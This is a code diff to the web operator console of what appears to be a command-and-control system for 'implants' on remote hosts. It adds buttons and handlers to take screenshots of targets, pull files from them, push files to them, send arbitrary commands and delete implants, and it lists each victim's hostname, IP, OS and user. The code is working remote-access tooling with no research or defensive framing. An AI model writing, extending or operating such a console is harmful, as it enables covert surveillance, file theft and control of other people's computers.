@@ -77,6 +77,26 @@
             border-color: #666;
             box-shadow: none;
         }
+        .implant-card.selected {
+            border-width: 2px;
+            background-color: rgba(0, 123, 255, 0.05);
+        }
+        .implant-card .btn-group {
+            opacity: 0.7;
+            transition: opacity 0.2s;
+        }
+        .implant-card:hover .btn-group {
+            opacity: 1;
+        }
+        .btn-group {
+            margin-bottom: 10px;
+        }
+        .btn-group .btn {
+            padding: 0.375rem 0.75rem;
+        }
+        .btn-group .btn i {
+            margin-right: 5px;
+        }
     </style>
 </head>
 <body>
@@ -112,6 +132,21 @@
                         <div id="terminal" class="terminal-output" style="height: 400px; overflow-y: auto; background-color: #1e1e1e; color: #fff; font-family: 'Consolas', monospace; padding: 10px; white-space: pre-wrap;">
                         </div>
                         <div class="mt-3">
+                            <!-- Quick Actions -->
+                            <div class="mb-3">
+                                <div class="btn-group">
+                                    <button class="btn btn-secondary" id="take-screenshot" title="Take Screenshot">
+                                        <i class="fa fa-camera"></i> Screenshot
+                                    </button>
+                                    <button class="btn btn-secondary" id="upload-file" title="Upload File">
+                                        <i class="fa fa-upload"></i> Upload
+                                    </button>
+                                    <button class="btn btn-secondary" id="download-file" title="Download File">
+                                        <i class="fa fa-download"></i> Download
+                                    </button>
+                                </div>
+                            </div>
+                            <!-- Command Input -->
                             <div class="input-group">
                                 <input type="text" id="commandInput" class="form-control" placeholder="Enter command...">
                                 <button class="btn btn-primary" onclick="sendCommand()">Send</button>
@@ -211,14 +246,25 @@
 
             Object.entries(implants).forEach(([id, implant]) => {
                 const card = document.createElement('div');
-                card.className = `card implant-card ${id === selectedImplantId ? 'border-primary' : ''}`;
+                card.className = `card implant-card ${id === selectedImplantId ? 'selected border-primary' : ''}`;
+                card.dataset.implantId = id;  // Add implant ID to the card
                 card.innerHTML = `
                     <div class="card-body">
-                        <h6 class="card-title">
-                            <span class="status-indicator ${implant.connected ? 'status-active' : 'status-inactive'}"></span>
-                            ${implant.hostname || 'Unknown Host'}
-                        </h6>
-                        <p class="card-text">
+                        <div class="d-flex justify-content-between align-items-start">
+                            <h6 class="card-title mb-0">
+                                <span class="status-indicator ${implant.connected ? 'status-active' : 'status-inactive'}"></span>
+                                ${implant.hostname || 'Unknown Host'}
+                            </h6>
+                            <div class="btn-group">
+                                <button class="btn btn-sm btn-primary select-implant" data-implant-id="${id}">
+                                    Select
+                                </button>
+                                <button class="btn btn-sm btn-danger delete-implant" data-implant-id="${id}">
+                                    <i class="fa fa-trash"></i>
+                                </button>
+                            </div>
+                        </div>
+                        <p class="card-text mt-2">
                             <small class="text-muted">
                                 IP: ${implant.ip || 'Unknown'}<br>
                                 OS: ${implant.os || 'Unknown'}<br>
@@ -227,9 +273,6 @@
                                 Last Seen: ${new Date(implant.last_seen).toLocaleString()}
                             </small>
                         </p>
-                        <button class="btn btn-sm btn-primary select-implant" data-implant-id="${id}">
-                            Select
-                        </button>
                     </div>
                 `;
                 implantsList.appendChild(card);
@@ -242,33 +285,60 @@
                     selectImplant(implantId);
                 });
             });
+
+            // Add event listeners to delete buttons
+            document.querySelectorAll('.delete-implant').forEach(button => {
+                button.addEventListener('click', (e) => {
+                    const implantId = e.target.dataset.implantId;
+                    if (confirm(`Are you sure you want to delete implant ${implantId}?`)) {
+                        deleteImplant(implantId);
+                    }
+                });
+            });
         }
 
         // Select implant
         function selectImplant(implantId) {
             selectedImplantId = implantId;
-            const implant = implants[implantId];
             
-            // Update selected implant info
-            document.getElementById('selected-implant-info').innerHTML = `
-                <h6>Selected Implant: ${implant.hostname || 'Unknown Host'}</h6>
-                <p class="text-muted">
-                    IP: ${implant.ip || 'Unknown'} | 
-                    OS: ${implant.os || 'Unknown'} | 
-                    User: ${implant.user || 'Unknown'}
-                </p>
-            `;
+            // Update selected state in UI
+            document.querySelectorAll('.implant-card').forEach(card => {
+                if (card.dataset.implantId === implantId) {
+                    card.classList.add('selected', 'border-primary');
+                } else {
+                    card.classList.remove('selected', 'border-primary');
+                }
+            });
 
-            // Update implants list to highlight selected implant
-            updateImplantsList();
-
-            // Get command history
-            socket.emit('get_command_history', { implant_id: implantId });
-
-            // Clear command output
-            document.getElementById('command-output').innerHTML = '';
-            document.getElementById('screenshot-container').innerHTML = '';
+            // Clear terminal and show selection message
+            const terminal = document.getElementById('terminal');
+            terminal.innerHTML = '';
+            appendToTerminal(`Selected implant: ${implants[implantId].hostname || implantId}`, 'output');
         }
+
+        // Delete implant
+        function deleteImplant(implantId) {
+            socket.emit('delete_implant', { implant_id: implantId });
+        }
+
+        // Handle implant deletion
+        socket.on('implant_deleted', function(data) {
+            if (data.status === 'success') {
+                // Remove implant from local state
+                delete implants[data.implant_id];
+                
+                // If the deleted implant was selected, clear selection
+                if (selectedImplantId === data.implant_id) {
+                    selectedImplantId = null;
+                }
+                
+                // Update UI
+                updateImplantsList();
+                appendToTerminal(`Implant ${data.implant_id} deleted`, 'output');
+            } else {
+                appendToTerminal(`Failed to delete implant: ${data.message}`, 'error');
+            }
+        });
 
         // Display command result
         function displayCommandResult(data) {
@@ -403,10 +473,11 @@
         // Event listeners for quick actions
         document.getElementById('take-screenshot').addEventListener('click', () => {
             if (!selectedImplantId) {
-                alert('Please select an implant first');
+                appendToTerminal('No implant selected', 'error');
                 return;
             }
-            socket.emit('execute_command', {
+            appendToTerminal('Taking screenshot...', 'output');
+            socket.emit('command', {
                 implant_id: selectedImplantId,
                 command: 'screenshot'
             });
@@ -414,7 +485,7 @@
 
         document.getElementById('upload-file').addEventListener('click', () => {
             if (!selectedImplantId) {
-                alert('Please select an implant first');
+                appendToTerminal('No implant selected', 'error');
                 return;
             }
             const modal = new bootstrap.Modal(document.getElementById('upload-modal'));
@@ -423,12 +494,13 @@
 
         document.getElementById('download-file').addEventListener('click', () => {
             if (!selectedImplantId) {
-                alert('Please select an implant first');
+                appendToTerminal('No implant selected', 'error');
                 return;
             }
             const filename = prompt('Enter filename to download:');
             if (filename) {
-                socket.emit('execute_command', {
+                appendToTerminal(`Downloading file: ${filename}`, 'output');
+                socket.emit('command', {
                     implant_id: selectedImplantId,
                     command: `download ${filename}`
                 });
@@ -473,6 +545,72 @@
             .catch(error => {
                 appendToTerminal(`Error: ${error.message}`, 'error');
             });
+        });
+
+        // Update upload form handler
+        document.getElementById('upload-submit').addEventListener('click', () => {
+            const fileInput = document.getElementById('file-input');
+            const file = fileInput.files[0];
+            
+            if (!file) {
+                appendToTerminal('No file selected', 'error');
+                return;
+            }
+            
+            const formData = new FormData();
+            formData.append('file', file);
+            
+            appendToTerminal(`Uploading file: ${file.name}`, 'output');
+            
+            fetch(`/api/implants/${selectedImplantId}/upload`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.error) {
+                    appendToTerminal(`Upload failed: ${data.error}`, 'error');
+                } else {
+                    appendToTerminal(`File uploaded successfully. Use 'download ${file.name}' to retrieve it.`, 'output');
+                    // Send command to implant to download the file
+                    socket.emit('command', {
+                        implant_id: selectedImplantId,
+                        command: `upload ${file.name}`
+                    });
+                }
+                bootstrap.Modal.getInstance(document.getElementById('upload-modal')).hide();
+                fileInput.value = ''; // Clear file input
+            })
+            .catch(error => {
+                appendToTerminal(`Upload failed: ${error.message}`, 'error');
+            });
+        });
+
+        // Update command result handler to handle screenshots
+        socket.on('command_result', function(data) {
+            if (data.result) {
+                try {
+                    // Try to parse result as JSON (for screenshots)
+                    const result = JSON.parse(data.result);
+                    if (result.status === 'success' && result.filename) {
+                        // Handle screenshot result
+                        appendToTerminal(result.message, 'output');
+                        // Create and append image element
+                        const img = document.createElement('img');
+                        img.src = `/uploads/${result.filename}`;
+                        img.style.maxWidth = '100%';
+                        img.style.marginTop = '10px';
+                        img.style.border = '1px solid #444';
+                        img.style.borderRadius = '4px';
+                        document.getElementById('terminal').appendChild(img);
+                        return;
+                    }
+                } catch (e) {
+                    // Not JSON, treat as regular output
+                }
+                // Regular command output
+                appendToTerminal(data.result);
+            }
         });
     </script>
 </body>
